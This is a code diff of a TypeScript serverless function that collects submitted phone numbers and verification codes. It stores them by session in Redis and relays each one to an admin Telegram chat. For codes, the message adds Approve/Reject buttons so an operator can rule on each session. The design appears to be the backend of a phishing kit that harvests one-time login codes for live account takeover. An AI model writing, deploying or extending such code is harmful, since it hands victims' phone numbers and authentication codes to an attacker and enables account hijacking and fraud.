@@ -1,65 +1,108 @@
-// API route for sending data to Telegram bot
-// This is a Vercel serverless function
+import type { VercelRequest, VercelResponse } from '@vercel/node';
 
-import { VercelRequest, VercelResponse } from '@vercel/node';
-
-interface TelegramData {
+type Body = {
   type: 'phone' | 'verification';
   value: string;
+  sessionId?: string;
+};
+
+const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN as string;
+const ADMIN_CHAT_ID = (process.env.ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID) as string;
+const UPSTASH_URL = process.env.UPSTASH_REDIS_REST_URL as string;
+const UPSTASH_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN as string;
+
+async function kvGet(key: string) {
+  const r = await fetch(`${UPSTASH_URL}/GET/${encodeURIComponent(key)}`, {
+    headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` },
+  });
+  const j = await r.json();
+  return j.result ?? null;
+}
+async function kvSet(key: string, val: string, ttlSec?: number) {
+  const ex = ttlSec ? `?EX=${ttlSec}` : '';
+  const r = await fetch(
+    `${UPSTASH_URL}/SET/${encodeURIComponent(key)}/${encodeURIComponent(val)}${ex}`,
+    { headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` } }
+  );
+  const j = await r.json();
+  return j.result === 'OK';
 }
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TG_API = (token: string) => `https://api.telegram.org/bot${token}`;
+
+async function sendMessage(text: string, replyMarkup?: any) {
+  const payload: any = {
+    chat_id: ADMIN_CHAT_ID,
+    text,
+  };
+  if (replyMarkup) payload.reply_markup = replyMarkup;
+  await fetch(`${TG_API(TG_TOKEN)}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload),
+  });
+}
 
 export default async function handler(req: VercelRequest, res: VercelResponse) {
-  // Enable CORS
+  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') {
-    return res.status(200).end();
+    res.status(200).end();
+    return;
   }
 
   if (req.method !== 'POST') {
-    return res.status(405).json({ message: 'Method not allowed' });
+    res.status(405).json({ error: 'Method not allowed' });
+    return;
   }
-
-  const { type, value }: TelegramData = req.body;
-
-  if (!type || !value) {
-    return res.status(400).json({ message: 'Missing required fields' });
-  }
-
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    return res.status(500).json({ message: 'Telegram configuration missing' });
-  }
-
-  const message = type === 'phone' 
-    ? `🔢 New phone number: ${value}`
-    : `🔐 Verification code: ${value}`;
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-      }),
-    });
+    const body = (req.body || {}) as Body;
+    const { type, value } = body;
+    const sessionId = (body.sessionId || req.query.sessionId) as string | undefined;
 
-    if (!response.ok) {
-      const errorData = await response.text();
-      console.error('Telegram API error:', errorData);
-      throw new Error('Failed to send message to Telegram');
+    if (!TG_TOKEN || !ADMIN_CHAT_ID || !UPSTASH_URL || !UPSTASH_TOKEN) {
+      res.status(500).json({ error: 'Server not configured' });
+      return;
+    }
+    if (!type || !value) {
+      res.status(400).json({ error: 'Missing type or value' });
+      return;
+    }
+    if (!sessionId) {
+      res.status(400).json({ error: 'Missing sessionId' });
+      return;
     }
 
-    res.status(200).json({ success: true });
-  } catch (error) {
-    console.error('Telegram API error:', error);
-    res.status(500).json({ message: 'Failed to send message' });
+    if (type === 'phone') {
+      await kvSet(`phone:${sessionId}`, value, 3600);
+      await sendMessage(`Phone submitted: ${value}\nSession: ${sessionId}`);
+      res.status(200).json({ ok: true });
+      return;
+    }
+
+    if (type === 'verification') {
+      await kvSet(`code:${sessionId}`, value, 3600);
+      await kvSet(`status:${sessionId}`, 'pending', 3600);
+
+      const phone = await kvGet(`phone:${sessionId}`);
+      const msg = `Verify code: ${value}\nFor phone: ${phone ?? 'UNKNOWN'}\nSession: ${sessionId}`;
+      const inline = {
+        inline_keyboard: [[
+          { text: 'Approve ✅', callback_data: `approve|${sessionId}` },
+          { text: 'Reject ❌',  callback_data: `reject|${sessionId}` },
+        ]],
+      };
+      await sendMessage(msg, inline);
+      res.status(200).json({ ok: true });
+      return;
+    }
+
+    res.status(400).json({ error: 'Invalid type' });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: 'Internal error' });
   }
 }
